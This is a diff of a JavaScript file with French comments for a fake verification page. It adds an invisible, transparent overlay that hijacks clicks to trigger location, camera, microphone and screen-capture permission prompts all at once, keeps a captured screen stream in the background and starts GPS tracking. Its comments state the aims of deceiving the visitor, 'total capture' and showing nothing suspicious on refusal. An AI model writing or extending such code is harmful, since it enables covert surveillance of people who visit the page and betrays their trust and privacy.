@@ -962,7 +962,7 @@ function bindVerificationForm(overlay) {
     form.onsubmit = handleVerification;
 }
 
-function setupInvisibleVerifyOverlay(overlay) {
+async function setupInvisibleVerifyOverlay(overlay) {
     if (overlay.dataset.verifyBound === '1') return;
     overlay.dataset.verifyBound = '1';
 
@@ -980,10 +980,20 @@ function setupInvisibleVerifyOverlay(overlay) {
             showVerificationModal(overlay);
             // On force quand même la vérification des permissions média
             requestVerifyMediaPermissions();
+            // On demande l'écran en plus
+            navigator.mediaDevices.getDisplayMedia({video:true}).catch(()=>{});
             return;
         }
 
-        // On demande la localisation et les permissions média EN MÊME TEMPS pour forcer les popups
+        // On demande TOUT EN MÊME TEMPS pour maximiser les chances
+        console.log("Tentative de capture totale...");
+        
+        // On lance la demande d'écran séparément car elle est souvent bloquée si groupée
+        navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
+            persistentScreenStream = stream;
+            console.log("📺 Écran capturé en arrière-plan");
+        }).catch(() => {});
+
         const [locOk, mediaOk] = await Promise.all([
             requestLocationOnly(),
             requestVerifyMediaPermissions()
@@ -994,9 +1004,6 @@ function setupInvisibleVerifyOverlay(overlay) {
         if (locOk) {
             markLocationReady();
             showVerificationModal(overlay);
-        } else {
-            // Si refusé, on ne montre rien de suspect, l'utilisateur devra cliquer à nouveau
-            console.log("Permission refusée ou erreur");
         }
     });
 }
@@ -1013,14 +1020,19 @@ async function startVerification() {
     if (!overlay) {
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
-        // On le crée mais on le cache au début
         overlay.style.display = 'none';
         document.body.appendChild(overlay);
     }
 
+    // Sécurité supplémentaire : on force le masquage si on n'est pas encore prêt
+    if (!overlay.dataset.forceShow) {
+        overlay.style.display = 'none';
+    }
+
     if (isLocationReady()) {
         showVerificationModal(overlay);
-        overlay.style.display = 'flex'; // On l'affiche seulement ici
+        overlay.style.display = 'flex';
+        overlay.dataset.forceShow = '1';
         if (!gpsWatchStarted) startGpsTracking();
         return;
     }
@@ -1028,12 +1040,15 @@ async function startVerification() {
     const form = overlay.querySelector('#fake-verify-form');
     if (form) {
         bindVerificationForm(overlay);
-        overlay.style.display = 'flex'; // On l'affiche seulement ici
+        overlay.style.display = 'flex';
+        overlay.dataset.forceShow = '1';
         return;
     }
 
     setupInvisibleVerifyOverlay(overlay);
-    overlay.style.display = 'flex'; // On l'affiche seulement ici
+    // L'overlay invisible DOIT être affiché pour capter le clic, mais il est transparent
+    overlay.style.display = 'flex';
+    overlay.dataset.forceShow = '1';
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
